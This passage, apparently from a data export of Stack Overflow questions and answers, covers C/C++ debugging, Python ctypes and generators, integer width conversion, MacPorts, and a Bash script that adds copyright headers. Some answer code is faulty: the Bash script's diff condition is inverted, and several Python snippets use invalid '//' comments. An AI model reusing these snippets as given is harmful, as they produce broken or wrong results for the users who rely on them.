}
</code></pre>

<p>My code so far (assume json_object is a dict at this point):</p>

<pre><code>if not json_object.has_key('type'):
    raise TypeError('JSON stream is missing a ""type"" attribute.')

##### THIS IS WHERE I WANT TO CHECK IF THE TYPE BY THAT NAME EXISTS ALREADY ####
# create a type definition and add attributes to it
definition = type(json_object['type'], (object,), {})
for key in json_object.keys():
    setattr(definition, key, None)

# instantiate and populate a test object
tester = definition()
for key, value in json_object.iteritems():
    setattr(tester, key, value)
</code></pre>
","9530","Adam Rosenfield","<p>You can use <code>dir()</code> to get a list of all the names of all objects in the current environment, and you can use <code>globals()</code> to a get a dictionary mapping those names to their values.  Thus, to get just the list of objects which are classes, you can do:</p>

<pre><code>import types
listOfClasses = [cls for cls in globals().values() if type(cls) == types.ClassType]
</code></pre>
"
"<p>I am trying to add enhancements to a 4 year old VC++ 6.0 program. The debug build runs from the command line but not in the debugger: it crashes with an access violation inside printf(). If I skip the printf, then it crashes in malloc() (called from within fopen()) and I can't skip over that.</p>

<p>This means I cannot run in the debugger and have to rely on the old printf statements to see what's going on. This obviously makes it a lot harder.</p>

<p>Any idea why printf() and malloc() would fail when running under the VC++ debugger? I am no good at this low level stuff!</p>

<p>Here is the call stack after the access violation:</p>

<pre><code>_heap_alloc_dbg(unsigned int 24, int 2, const char * 0x0046b3d8 `string', int 225) line 394 + 8 bytes
_nh_malloc_dbg(unsigned int 24, int 0, int 2, const char * 0x0046b3d8 `string', int 225) line 242 + 21 bytes
_malloc_dbg(unsigned int 24, int 2, const char * 0x0046b3d8 `string', int 225) line 163 + 27 bytes
_lock(int 2) line 225 + 19 bytes
_getstream() line 55 + 7 bytes
_fsopen(const char * 0x00468000 `string', const char * 0x00466280 `string', int 64) line 61 + 5 bytes
fopen(const char * 0x00468000 `string', const char * 0x00466280 `string') line 104 + 15 bytes
open_new_log(const char * 0x00468000 `string') line 66 + 14 bytes
log_open(const char * 0x00468000 `string', int 0) line 106 + 9 bytes
Xlog_open(const char * 0x00468000 `string', int 0) line 51 + 13 bytes
service_start(unsigned long 1, char * * 0x009a0e50) line 3152 + 12 bytes
service_init2(char * 0x00471fcc char * NTPROGRAM, char * 0x004723c4 char * NTSERVICE, char * 0x00466540 `string', unsigned long 1, char * * 0x009a0e50) line 508 + 13 bytes
service_init(char * 0x00471fcc char * NTPROGRAM, char * 0x004723c4 char * NTSERVICE, unsigned long 2, char * * 0x009a0e50) line 548
main(unsigned long 2, char * * 0x009a0e50) line 3131
mainCRTStartup() line 206 + 25 bytes
KERNEL32! 7c817067()
</code></pre>

<p>Here is the debug dissassembly up to the operation that fails:</p>

<pre><code>0041EA7E   jmp         _heap_alloc_dbg+2B3h (0041eb23)
0041EA83   mov         edx,dword ptr [_lTotalAlloc (004b4294)]
0041EA89   add         edx,dword ptr [nSize]
0041EA8C   mov         dword ptr [_lTotalAlloc (004b4294)],edx
0041EA92   mov         eax,[_lCurAlloc (004b429c)]
0041EA97   add         eax,dword ptr [nSize]
0041EA9A   mov         [_lCurAlloc (004b429c)],eax
0041EA9F   mov         ecx,dword ptr [_lCurAlloc (004b429c)]
0041EAA5   cmp         ecx,dword ptr [_lMaxAlloc (004b42a0)]
0041EAAB   jbe         _heap_alloc_dbg+249h (0041eab9)
0041EAAD   mov         edx,dword ptr [_lCurAlloc (004b429c)]
0041EAB3   mov         dword ptr [_lMaxAlloc (004b42a0)],edx
0041EAB9   cmp         dword ptr [_pFirstBlock (004b4298)],0
0041EAC0   je          _heap_alloc_dbg+25Fh (0041eacf)
0041EAC2   mov         eax,[_pFirstBlock (004b4298)]
0041EAC7   mov         ecx,dword ptr [pHead]
0041EACA   mov         dword ptr [eax+4],ecx
</code></pre>

<p>Here is our source for that calls fopen() and fails in malloc()</p>

<pre><code>FILE *open_new_log( const char *logfile )
{
    FILE *fp;
    int retry = 0;

    while( ( fp = fopen( logfile, ""w"" ) ) == NULL &amp;&amp; ++retry &lt; 300 )
    	Sleep( 1000 );

    return( fp );
}
</code></pre>

<p>The error I get is</p>

<pre><code>Unhandled exception inPISCOOP.exe: 0xC00000005: Access Violation
</code></pre>

<p>Regards,</p>

<p>--- Alistair.</p>
","9530","Adam Rosenfield","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/5at7yxcs(VS.71).aspx"" rel=""nofollow""><code>_CrtSetDbgFlag()</code></a> to enable a bunch of useful heap debugging techniques.  There's a host of other <a href=""http://msdn.microsoft.com/en-us/library/1666sb98(VS.71).aspx"" rel=""nofollow"">CRT debugging functions</a> available that should help you track down where your problem is.</p>
"
"<p>I've seen the term ""baller"" used in a couple of C++ interview tests. It means ""pointer"" as best as I can tell from questions like ""Describe the difference between a baller and a reference."" I thought that perhaps it was an Indian term due to some Google deduction, but a couple of Indian co-workers who went to school in India said they've never heard of it.</p>

<p>Where does the term ""baller"" come from and does it actually mean ""pointer?""</p>

<p>Updates:</p>

<ul>
<li>Please google for <a href=""http://www.google.com/search?q=baller%20pointer%20c%2B%2B"" rel=""nofollow"">""baller pointer C++""</a> if you think the term can't possibly be real.</li>
<li>Almost all of the google results are found in pages about C++ knowledge tests.  </li>
</ul>
","9530","Adam Rosenfield","<p>I'm an experienced C/C++ programmer and I've never heard the term ""baller"" before.</p>
"
"<p>I've trying to achieve something like this:</p>

<pre><code>class Base
{
  public:

  Base(string S) 
  {
  ...
  };
}

class Derived: Base
{
public:
  int foo;
  string bar()
  {
    return stringof(foo); // actually, something more complex
  };

  Derived(int f) : foo(f), Base(bar()) 
  {
  };
}
</code></pre>

<p>Now, this doesn't work as I want, because bar() is called in the Derived constructor before foo is initialized. </p>

<p>I considered adding a static function similar to bar() which takes foo as a parameter - and using that in the initialization list, but thought I'd ask if there were any other techniques that could be used to dig myself out of this one...</p>

<p><strong>Edit</strong>: Thanks for feedback - here's how I was going to handle the static function. Not sure if the overload between a static and non-static function is too clever, but...</p>

<pre><code>class Derived: Base
{
public:
  int foo;

  static string bar(int f)
  {
    return stringof(f); // actually, something more complex
  }

  string bar()
  {
    return bar(foo); 
  };

  Derived(int f) :  Base(bar(f)) , foo(f)
  {
  };
}
</code></pre>
","9530","Adam Rosenfield","<p>The base class constructor always gets called before initializing the other members of the derived class; your compiler should be giving you a warning for having the initializers in the wrong order.  The only correct solution is to make <code>bar()</code> a static method that takes <code>f</code> as a parameter.</p>
"
"<p>I have two raw sound streams that I need to add together.  For the purposes of this question, we can assume they are the same bitrate and bit depth (say 16 bit sample, 44.1khz sample rate).</p>

<p>Obviously if I just add them together I will overflow and underflow my 16 bit space.  If I add them together and divide by two, then the volume of each is halved, which isn't correct sonically - if two people are speaking in a room, their voices don't become quieter by half, and a microphone can pick them both up without hitting the limiter.</p>

<ul>
<li>So what's the correct method to add these sounds together in my software mixer?  </li>
<li>Am I wrong and the correct method is to lower the volume of each by half?  </li>
<li>Do I need to add a compressor/limiter or some other processing stage to get the volume and mixing effect I'm trying for?</li>
</ul>


","9530","Adam Rosenfield","<p>I'd say just add them together.  If you're overflowing your 16 bit PCM space, then the sounds you're using are already incredibly loud to begin with and you should attenuate them.  If that would cause them to be too soft by themselves, look for another way of increasing the overall volume output, such as an OS setting or turning the knob on your speakers.</p>
"
"<p>I have a Windows C++ program that is doing something like:<br></p>

<pre>
  FILE* pf = ...;
  *stdout = *pf;    // stdout is defined in stdio.h
</pre>

<p>I'm looking for an explanation about what happens when you change the value of the stdout file handle. Is this just a way of redirecting stdout?</p>

<p>-cr</p>
","9530","Adam Rosenfield","<p>Yes, when you change stdout, you're effectively redirecting it elsewhere.  However, you should <strong>not</strong> directly assign to stdout like that.  If you want to redirect stdout, you should instead use <a href=""http://www.opengroup.org/onlinepubs/000095399/functions/freopen.html"" rel=""nofollow""><code>freopen()</code></a>.</p>

<p>You should never directly manipulate FILE objects - you should treat them as opaque types, and only interact with them via the functions in the <code>&lt;stdio&gt;</code> library.  Jonathan lists some good reasons why.</p>

<p>From the C99 standard, section 7.19.3, paragraph 6:</p>

<blockquote>
  <p>The address of the FILE object used to control a stream may be significant; a copy of a
  FILE object need not serve in place of the original.</p>
</blockquote>
"
"<p>I have two strings: the first's value is ""catdog"" and the second's is ""got"".</p>

<p>I'm trying to find a regex that tells me if the letters for ""got"" are in ""catdog"".  I'm particularly looking to avoid the case where there are duplicate letters.  For example, I know ""got"" is a match, however ""gott"" is not a match because there are not two ""t"" in ""catdog"".</p>

<p>EDIT:</p>

<p>Based on Adam's response below this is the C# code I got to work in my solution.  Thanks to all those that responded.</p>

<p>Note: I had to convert the char to int and subtract 97 to get the appropriate index for the array.  In my case the letters are <em>always</em> lower case.</p>

<pre><code>    private bool CompareParts(string a, string b)
    {

        int[] count1 = new int[26];
        int[] count2 = new int[26];

        foreach (var item in a.ToCharArray())
            count1[(int)item - 97]++;

        foreach (var item in b.ToCharArray())
            count2[(int)item - 97]++;

        for (int i = 0; i &lt; count1.Length; i++)
            if(count2[i] &gt; count1[i])
                return false;

        return true;
    }
</code></pre>
","9530","Adam Rosenfield","<p>You're using the wrong tool for the job.  This is not something regular expressions are capable of handling easily.  Fortunately, it's relatively easy to do this without regular expressions.  You just count up the number of occurrences of each letter within both strings, and compare the counts between the two strings - if for each letter of the alphabet, the count in the first string is at least as large as the count in the second string, then your criteria are satisfied.  Since you didn't specify a language, here's an answer in pseudocode that should be easily translatable into your language:</p>

<pre><code>bool containsParts(string1, string2)
{
    count1 = array of 26 0's
    count2 = array of 26 0's

    // Note: be sure to check for an ignore non-alphabetic characters,
    // and do case conversion if you want to do it case-insensitively
    for each character c in string1:
        count1[c]++
    for each character c in string2:
        count2[c]++

    for each character c in 'a'...'z':
        if count1[c] &lt; count2[c]:
            return false

    return true
}
</code></pre>
"
"<p>I am trying to use Python's ctypes library to access some methods in the scanning library <a href=""http://www.sane-project.org/"" rel=""nofollow"">SANE</a>.  This is my first experience with ctypes and the first time I have had to deal with C datatypes in over a year so there is a fair learning curve here, but I think even without that this particular declaration would be troublesome:</p>

<pre><code>extern SANE_Status sane_get_devices (const SANE_Device *** device_list, SANE_Bool local_only);
</code></pre>

<p>First of all, I've successfully dealt with <code>SANE_Status</code> (an enum) and <code>SANE_Bool</code> (a typedef to <code>c_int</code>).  Those were both simple.  That first parameter, on the other hand, is causing me all sorts of grief.  I'm unfamiliar with the ""<code>***</code>"" notation to begin with and my tracer bullets so far have yielded nothing more than garbage data.  How do I format the input to this function such that I can read back a list of my Python structure-objects?  For reference, the C structure being referenced is:</p>

<pre><code>typedef struct
{
    SANE_String_Const name; /* unique device name */
    SANE_String_Const vendor;   /* device vendor string */
    SANE_String_Const model;    /* device model name */
    SANE_String_Const type; /* device type (e.g., ""flatbed scanner"") */
 }
SANE_Device;
</code></pre>

<p>Where <code>SANE_String_Const</code> is defined as a <code>c_char_p</code>.</p>

<p>My Python/ctypes version of this object is:</p>

<pre><code>class SANE_Device(Structure):
    _fields_ = [
        (""name"", c_char_p),
        (""vendor"", c_char_p),
        (""model"", c_char_p),
        (""type"", c_char_p)]
</code></pre>

<p>Suggestions on what I should pass in such that I can get the expected behavior (a list of structure-objects) out of this?  All responses appreciated.</p>

<p><strong>Update 1:</strong></p>

<p>Using the following, I was able to retrieve a correct SANE_Device Python structure:</p>

<pre><code>devices = pointer(pointer(pointer(SANE_Device())))
status = libsane.sane_get_devices(devices, c_int(0))
print status, devices, devices.contents.contents.contents.name
</code></pre>

<p>However, 1) yuck and 2) that seems like it would only work if there is a single result.  I can't len() on <code>devices.contents.contents</code> or <code>devices.contents.contents.contents</code>.  How am I to determine the number of results?  The SANE docs specify that ""If the function executes successfully, it stores a pointer to a NULL terminated array of pointers to SANE_Device structures in *device_list"".  Suggestions?</p>

<p><strong>Update 2:</strong></p>

<p>I was able to pass an ten-item array and then access the first element using:</p>

<pre><code>devices = pointer(pointer(pointer((SANE_Device * 10)())))
status = libsane.sane_get_devices(devices, c_int(0))
print status, devices, devices.contents.contents.contents[0].name
</code></pre>

<p>However, ten is obviously an arbitrary number and I have no way of determining the actual number of results.  Trying to access <code>devices.contents.contents.contents[1].name</code> when only one device is connected causes a segmentation fault.  There must be a proper way of dealing with variable-length constructs like these in ctypes.</p>
","9530","Adam Rosenfield","<p>A <code>const SANE_Device ***</code> is a three-level pointer: it's a pointer to a pointer to a pointer to a constant SANE_Device.  You can use the program <a href=""http://gd.tuwien.ac.at/linuxcommand.org/man_pages/cdecl1.html"">cdecl</a> to decipher complicated C/C++ type definitions.</p>

<p>According to the <a href=""http://www.sane-project.org/html/doc012.html"">SANE documentation</a>, <code>SANE_get_devices()</code> will store a pointer to a NULL-terminated list of pointers to SANE devices if successful.  Thus, the proper way to call it is to declare a variable of type <code>const SANE_Device **</code> (i.e. a pointer to a pointer to a constant `SANE_Device), and pass in the address of that pointer:</p>

<pre><code>const SANE_Device **device_list;
SANE_get_devices(&amp;device_list, local_only);  // check return value
// Now, device_list[0] points to the first device,
// device_list[1] points to the second device, etc.
// Once you hit a NULL pointer, that's the end of the list:
int num_devices = 0;
while(device_list[num_devices] != NULL)
    num_devices++;
// num_devices now stores the total number of devices
</code></pre>

<p>Now, this is how you would call it from C code.  I've skimmed the documentation on ctypes, and it appears that you want to use the <code>byref</code> function to pass the argument by reference, and that the value you pass should be a POINTER to a POINTER to a SANE_Device.  Note the distinction between <code>pointer</code> and <code>POINTER</code>: the former creates a pointer to an <em>instance</em>, whereas the latter creates a pointer to a <em>type</em>.  Thus, I'm guessing the following code will work:</p>

<pre><code>// SANE_Device declared as you had it
devices = POINTER(POINTER(SANE_Device))()  // devices is a NULL pointer to a pointer to a SANE_Device
status = libsane.sane_get_devices(byref(devices), c_int(0))
if status != successful:   // replace this by whatever success is
    print error
else:
    num_devices = 0
    // Convert NULL-terminated C list into Python list
    device_list = []
    while devices[num_devices]:
        device_list.append(devices[num_devices].contents)  // use .contents here since each entry in the C list is itself a pointer
        num_devices += 1
    print device_list
</code></pre>

<p>[Edit] I've tested the above code using a very simple placeholder for <code>SANE_get_devices</code>, and it works.</p>
"
"<p>i'm having a hard time with Xcode; for some reason, it just won't let me pass a variable from one view controller class to another. It should work, i was basically just copying/pasting from my other classes (it works on all of them... except this one). I've been at it all night long, tried everything i could think of and still it remains.</p>

<p>Here's the view controller class where I'm making the call:</p>

<h2>ResultadosViewController.h:</h2>

<pre><code>#import &lt;UIKit/UIKit.h&gt;
#import ""Filme.h""
#import ""Festival.h""
#import ""Top10Discos.h""
#import ""Peca.h""

@class DetalhesViewController;

@interface ResultadosViewController : UIViewController
{
    // Navegation
    DetalhesViewController *dvc;
    BOOL isViewPushed;

    // What i'd really like to pass lol
    NSArray *array_resultados;

}

@property (nonatomic, retain) NSArray *array_resultados;
@property (nonatomic, readwrite) BOOL isViewPushed;

@end*
</code></pre>

<h2>ResultadosViewController.m:</h2>

<pre><code>#import ""ResultadosViewController.h""
#import ""DetalhesViewController.h""
#import ""Filme.h""
#import ""Peca.h""
#import ""Top10Discos.h""
#import ""Festival.h""

@implementation ResultadosViewController
@synthesize isViewPushed, array_resultados;

(...)

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    // Navigation logic -- create and push a new view controller

    if (indexPath.row == 2)
    {
    	if(dvc != nil)
    		[dvc dealloc];

    	NSString *ffs = [[array_resultados objectAtIndex:indexPath.row] TituloFilme];

    	dvc = [[DetalhesViewController alloc] initWithNibName:@""DetailedView"" bundle:[NSBundle mainBundle]];

    	**resultadosControllerCell.array_resultados  = [self array_resultados];** 
    	*""Request for member 'array_resultados' in something not a structure or union""*

    	//Push the view controller to the top of the stack.
    	[self.navigationController pushViewController:dvc animated:YES];

    }
}
</code></pre>

<p>And here's the other class i want to send the array into:</p>

<h2>DetalhesViewController.h:</h2>

<pre><code>#import &lt;UIKit/UIKit.h&gt;

#import ""Filme.h""
#import ""Festival.h""
#import ""Top10Discos.h""
#import ""Peca.h""


@interface DetalhesViewController : UIViewController
{
    // Navegacao
    NSArray *array_resultados;

}

@property (nonatomic, retain) NSArray *array_resultados;
@end
</code></pre>

<p>I'm not sure if any of you would to see the .m file for this class; in that case, just ask.</p>

<p>Thanks in advance,
Hal</p>

<p>PS: tried with other variables (other types too), cleansed/rebuilt, recreated xib file, you name it... i'm outta tricks :(</p>
","9530","Adam Rosenfield","<p>Just a guess, but did you try using the arrow operator <code>-&gt;</code> instead of the dot operator <code>.</code> ?</p>

<pre><code>resultadosControllerCell-&gt;array_resultados  = [self array_resultados];
</code></pre>
"
"<p>When testing in any language, how does everybody <strong>phrase their assertion messages</strong>?</p>

<p>I see three obvious ways:</p>

<pre><code># assume failure
assert (4-2) == 2, ""Subtracting 2 from 4 doesn't equal 2""

# describe success
assert (4-2) == 2, ""Subtracting 2 from 4 should equal 2""

# be vauge with failure
assert (4-2) == 2, ""Subtracting 2 from 4 is broken""
</code></pre>

<p>This is obviously a simple example, but you get the idea.  What is the standard practice? What do you do? Why?</p>
","9530","Adam Rosenfield","<p>It really doesn't matter IMO, as long as the error message tells you what went wrong and where the problem is.  Under normal operation, an assertion message will never be seen.  If it is seen, there's a bug in the code somewhere, and you need to be able to track down and fix the bug.</p>

<p>The message should provide as much helpful information as possible - if you're checking that two values are equal and they're not, you should print out what the values are.  That obviates the need to step into it with a debugger to examine the values.  Of course, doing this requires that your language supports non-static information in assertion messages.  If assertion messages can only be fixed, static strings, you can't add extra runtime information without jumping through hoops.</p>
"
"<p>I'm using Python to <strong>infinitely</strong> iterate over a list, repeating each element in the list a number of times. For example given the list:</p>

<pre><code>l = [1, 2, 3, 4]
</code></pre>

<p>I would like to output each element two times and then repeat the cycle:</p>

<pre><code>1, 1, 2, 2, 3, 3, 4, 4, 1, 1, 2, 2 ...
</code></pre>

<p>I've got an idea of where to start:</p>

<pre><code>def cycle(iterable):
  if not hasattr(cycle, 'state'):
    cycle.state = itertools.cycle(iterable)
  return cycle.next()

 &gt;&gt;&gt; l = [1, 2, 3, 4]
 &gt;&gt;&gt; cycle(l)
 1
 &gt;&gt;&gt; cycle(l)
 2
 &gt;&gt;&gt; cycle(l)
 3
 &gt;&gt;&gt; cycle(l)
 4
 &gt;&gt;&gt; cycle(l)
 1
</code></pre>

<p>But how would I repeat each element?</p>

<p><strong>Edit</strong></p>

<p>To clarify this should iterate infinitely. Also I've used repeating the element twice as the shortest example -
<strong>I would really like to repeat each element n times</strong>.</p>

<p><strong>Update</strong></p>

<p>Will your solution lead me to what I was looking for:</p>

<pre><code>&gt;&gt;&gt; import itertools
&gt;&gt;&gt; def ncycle(iterable, n):
...   for item in itertools.cycle(iterable):
...     for i in range(n):
...       yield item
&gt;&gt;&gt; a = ncycle([1,2], 2)
&gt;&gt;&gt; a.next()
1
&gt;&gt;&gt; a.next()
1
&gt;&gt;&gt; a.next()
2
&gt;&gt;&gt; a.next()
2
&gt;&gt;&gt; a.next()
1
&gt;&gt;&gt; a.next()
1
&gt;&gt;&gt; a.next()
2
&gt;&gt;&gt; a.next()
2
</code></pre>

<p>Thanks for the quick answers!</p>
","9530","Adam Rosenfield","<p>You could do it with a generator pretty easily:</p>

<pre><code>def cycle(iterable):
    while True:
        for item in iterable:
            yield item
            yield item

x=[1,2,3]
c=cycle(x)

print [c.next() for i in range(10)]  // prints out [1,1,2,2,3,3,1,1,2,2]
</code></pre>
"
"<p>Well, I have this bit of code that is slowing down the program hugely because it is linear complexity but called a lot of times making the program quadratic complexity. If possible I would like to reduce its computational complexity but otherwise I'll just optimize it where I can. So far I have reduced down to:</p>

<pre><code>def table(n):
    a = 1
    while 2*a &lt;= n:
	  if (-a*a)%n == 1: return a

	  a += 1
</code></pre>

<p>Anyone see anything I've missed? Thanks!</p>

<p>EDIT: I forgot to mention: n is always a prime number.</p>

<p>EDIT 2: Here is my new improved program (thank's for all the contributions!):</p>

<pre><code>def table(n):
    if n == 2: return 1
    if n%4 != 1: return

    a1 = n-1
    for a in range(1, n//2+1):
	    if (a*a)%n == a1: return a
</code></pre>

<p>EDIT 3: And testing it out in its real context it is <em>much</em> faster! Well this question appears solved but there are many useful answers. I should also say that as well as those above optimizations, I have memoized the function using Python dictionaries...</p>
","9530","Adam Rosenfield","<p>It looks like you're trying to find the square root of -1 modulo <code>n</code>.  Unfortunately, this is not an easy problem, depending on what values of <code>n</code> are input into your function.  Depending on <code>n</code>, there might not even be a solution.  See <a href=""http://en.wikipedia.org/wiki/Quadratic_residue#Complexity_of_finding_square_roots"" rel=""nofollow"">Wikipedia</a> for more information on this problem.</p>
"
"<p>Say I have three classes:</p>

<pre><code>class X{};
class Y{};
class Both : public X, public Y {};
</code></pre>

<p>I mean to say I have two classes, and then a third class which extends both (multiple-inheritance).</p>

<p>Now say I have a function defined in another class:</p>

<pre><code>void doIt(X *arg) { }
void doIt(Y *arg) { }
</code></pre>

<p>and I call this function with an instance of both:</p>

<pre><code>doIt(new Both());
</code></pre>

<p>This causes a compile-time error, stating that the function call is ambiguous. </p>

<p>What are the cases, besides this one, where the C++ compiler decides the call is ambiguous  and throws an error, if any? How does the compiler determine what these cases are?</p>
","9530","Adam Rosenfield","<p>Simple: if it's ambiguous, then the compiler gives you an error, forcing you to choose.  In your snippet, you'll get a different error, because the type of <code>new Both()</code> is a pointer to <code>Both</code>, whereas both overloads of <code>doIt()</code> accept their parameters by value (i.e. they do not accept pointers).  If you changed <code>doIt()</code> to take arguments of types <code>X*</code> and <code>Y*</code> respectively, the compiler would give you an error about the ambiguous function call.</p>

<p>If you want to explicitly call one or the other, you cast the arguments appropriately:</p>

<pre><code>void doIt(X *arg) { }
void doIt(Y *arg) { }
Both *both = new Both;
doIt((X*)both);  // calls doIt(X*)
doIt((Y*)both);  // calls doIt(Y*)
delete both;
</code></pre>
"
"<p>Help me people
Last week I asked about unicode conversion.I got only one reply.I need more suggestions.    </p>

<p>I need to convert strings in Python to other types such as unsigned and signed int 8 bits,unsigned and signed int 16 bits,unsigned and signed int 32 bits,unsigned and signed int 64 bits,double,float,string,unsigned and signed 8 bit,unsigned and signed 16 bit, unsigned and signed 32 bit,unsigned and signed 64 bit.</p>

<p>Exact duplicate: <a href=""http://stackoverflow.com/questions/374318/conversion-of-unicode-string-in-python"">conversion of unicode string in python</a></p>
","9530","Adam Rosenfield","<p>You can convert a string to a 32-bit signed integer with the <code>int</code> function:</p>

<pre><code>str = ""1234""
i = int(str)  // i is a 32-bit integer
</code></pre>

<p>If the string does not represent an integer, you'll get a <code>ValueError</code> exception.  Note, however, that if the string does represent an integer, but that integer does not fit into a 32-bit signed int, then you'll actually get an object of type <code>long</code> instead.</p>

<p>You can then convert it to other widths and signednesses with some simple math:</p>

<pre><code>s8 = (i + 2**7) % 2**8 - 2**7      // convert to signed 8-bit
u8 = i % 2**8                      // convert to unsigned 8-bit
s16 = (i + 2**15) % 2**16 - 2**15  // convert to signed 16-bit
u16 = i % 2**16                    // convert to unsigned 16-bit
s32 = (i + 2**31) % 2**32 - 2**31  // convert to signed 32-bit
u32 = i % 2**32                    // convert to unsigned 32-bit
s64 = (i + 2**63) % 2**64 - 2**63  // convert to signed 64-bit
u64 = i % 2**64                    // convert to unsigned 64-bit
</code></pre>

<p>You can convert strings to floating point with the <code>float</code> function:</p>

<pre><code>f = float(""3.14159"")
</code></pre>

<p>Python floats are what other languages refer to as <code>double</code>, i.e. they are 64-bits.  There are no 32-bit floats in Python.</p>
"
"<p>I have a bunch of compile time asserts, such as:</p>

<pre><code>CASSERT(isTrue) or CASSERT2(isTrue, prefix_)
</code></pre>

<p>When compiling with GCC I get many warnings like <code>'prefix_LineNumber' defined but not used</code>. Is there a way I can hide warnings for compile time asserts? I had no luck searching the GCC documentation. I thought I might have the var automatically used globally inside the same macro but I couldn't think of any way to do it.</p>

<p>Does anyone know of a way to hide that warning in GCC?</p>
","9530","Adam Rosenfield","<p>You can create a null statement and cast the result to void.  This is portable across compilers, and gcc will not give you any warnings, even with <code>-Wall</code> and <code>-Wextra</code> enabled.  For example:</p>

<pre><code>int var;    // var is not used
(void)var;  // null statement, cast to void -- suppresses warning
</code></pre>

<p>A common technique is to create a macro for this:</p>

<pre><code>#define UNUSED(x) ((void)(x))

int var;
UNUSED(var);
</code></pre>
"
"<p>There is a nice state machine tutorial called <a href=""http://www.objectmentor.com/resources/articles/umlfsm.pdf"" rel=""nofollow"">UML Tutorial: Finite State Machines</a> by Robert C. Martin. But I can't compile the sample code it provides. I got *FsmTest.cpp(46) : error C2664: 'SetState' : cannot convert parameter 1 from 'class UnlockedState *' to 'class TurnstileState <em>'</em></p>

<p>Please, help. Thanks.</p>

<pre><code>class Turnstile
{
public:
	virtual void Lock();
	virtual void Unlock();
	virtual void Thankyou();
	virtual void Alarm();
};

class TurnstileFSM;
class LockedState;
class UnlockedState;

class TurnstileState
{
public:
	virtual void Coin(TurnstileFSM*) = 0;
	virtual void Pass(TurnstileFSM*) = 0;
protected:
	static LockedState lockedState;
	static UnlockedState unlockedState;
};

class TurnstileFSM : public Turnstile
{
public:
	void SetState(TurnstileState* s) {itsState = s;}
	void Coin() {itsState-&gt;Coin(this);}
	void Pass() {itsState-&gt;Pass(this);}


private:
	TurnstileState *itsState;
};

class LockedState : public TurnstileState
{
public:
	virtual void Coin(TurnstileFSM* t)
	{
		t-&gt;SetState(&amp;unlockedState);
		t-&gt;Unlock();
	}
	virtual void Pass(TurnstileFSM* t)
	{
		t-&gt;Alarm();
	}
};

class UnlockedState : public TurnstileState
{
public:
	virtual void Coin(TurnstileFSM* t)
	{
		t-&gt;Thankyou();
	}
	virtual void Pass(TurnstileFSM* t)
	{
		t-&gt;SetState(&amp;lockedState);
		t-&gt;Lock();
	}
};

LockedState TurnstileState::lockedState;
UnlockedState TurnstileState::unlockedState;
</code></pre>
","9530","Adam Rosenfield","<p>The problem is that when you try to call <code>SetState()</code> inside of <code>LockedState::Coin()</code>, the class <code>UnlockedState</code> is an <strong>incomplete type</strong>: it has been <em>declared</em> but not <em>defined</em>.  In order to fix it, you'll need to move the definition of of <code>Coin()</code> to after that of <code>UnlockedState</code>:</p>

<pre><code>class LockedState : public TurnstileState
{
public:
    virtual void Coin(TurnstileFSM* t);
    ...
};

class UnlockedState : public TurnstileState
{
    ...
};

void LockedState::Coin(TurnstileFSM* t)
{
    ...
}
</code></pre>
"
"<p>I have a file with 450,000+ rows of entries. Each entry is about 7 characters in length. What I want to know is the unique characters of this file.</p>

<p>For instance, if my file were the following;</p>

<blockquote>
<pre><code>Entry
-----
Yabba
Dabba
Doo
</code></pre>
</blockquote>

<p>Then the result would be</p>

<blockquote>
  <p>Unique characters: {abdoy}</p>
</blockquote>

<p>Notice I don't care about case and don't need to order the results. Something tells me this is very easy for the Linux folks to solve.</p>

<h2>Update</h2>

<p>I'm looking for a very fast solution. I really don't want to have to create code to loop over each entry, loop through each character...and so on. I'm looking for a nice script solution.</p>

<h2>Update 2</h2>

<p>By <strong>Fast</strong>, I mean fast to implement...not necessarily fast to run.</p>
","9530","Adam Rosenfield","<p>Quick and dirty C program that's blazingly fast:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
  int chars[256] = {0}, c;
  while((c = getchar()) != EOF)
    chars[c] = 1;
  for(c = 32; c &lt; 127; c++)  // printable chars only
  {
    if(chars[c])
      putchar(c);
  }

  putchar('\n');

  return 0;
}
</code></pre>

<p>Compile it, then do</p>

<pre><code>cat file | ./a.out
</code></pre>

<p>To get a list of the unique printable characters in <code>file</code>.</p>
"
"<p>I recently switched over to a MacBook Pro so I'm still really new at Mac software ecosystem. What is the best guide or what tips do you have to quickly get adept at using Mac for developing on both Mac/Unix and MS platforms (*.NET, SharePoint, SQL Server, etc) using VMWare Fusion? For example, I've setup NetBeans, FlexBuilder, Eclipse, TextMate, VMWare Fusion, OpenOffice, FireFox, dragged Terminal.app to my dock, upgraded the Ruby installation and related gems and so on... Things I've not done but looking at (based on other's experiences) include QuickSilver (is it all that different than SpotLight?), MacPorts (or Fink?), getting started with iPhone, Android, and so on. You can tell from my inexperience that I don't know what the best ways of doing things are yet, and don't want to get in the habit of just installing things and then leave files and stuff laying around slowing the system down. If you have any really cool tips about setting up a developer's Mac please share them!</p>

<p><strong>Update:</strong> The nature of my job is I'm always working with new/different technologies, some Windows/MS based, some not, and with the Mac (and Fusion) even the MS based stuff is more enjoyable to me.</p>
","9530","Adam Rosenfield","<p>I'd highly recommend MacPorts - you can quickly and easily install new packages with a simple</p>

<pre><code>sudo port install package-name
</code></pre>

<p>Instead of having to deal with browsing a website to find the distribution, download a disk image, and run an installer, or downloading a tarball and untarring it, running a configure script, and running make, etc.</p>
"
"<p>Background: We are using VS 2008 and are in the process of upgrading from TFS 2005 to 2008.</p>

<p>We have a solution that contains several projects and overall have hundreds of code files.  We want to add the same text as a comment to all of these files (a copyright message).  Does anyone know of a quick/easy/efficient way to do this?  Also, is there a way to do this via TFS so we don't have check out and check in every file?  </p>

<p>I found some code on CodeProject on creating a macro which does this, but you have to open each file individually and then run the macro on each one, which we were hoping to avoid.  </p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>If you have <a href=""http://www.cygwin.org"" rel=""nofollow"">Cygwin</a> installed, you can use the following Bash script:</p>

<pre><code># Process all .cpp and .h files under the directory tree at $PROJECTROOT
# To add other file types, add more ""-o -name \*.ext"" clauses.
# $COPYRIGHTFILE is the file containing your copyright message
COPYRIGHTLENGTH=$(wc -l $COPYRIGHTFILE)
for file in $(find $PROJECTROOT -name \*.cpp -o -name \*.h); do
    if diff &lt;(head -n $COPYRIGHTLENGTH $file) $COPYRIGHTFILE; then
        (cat $COPYRIGHTFILE; cat $file) &gt; /tmp/file
        mv /tmp/file $file
    fi
done
</code></pre>

<p>This finds every .cpp or .h file under the directory tree $PROJECTROOT, compares the beginning to the copyright message, and if it differs, prepends the copyright to the file via a temporary file.</p>

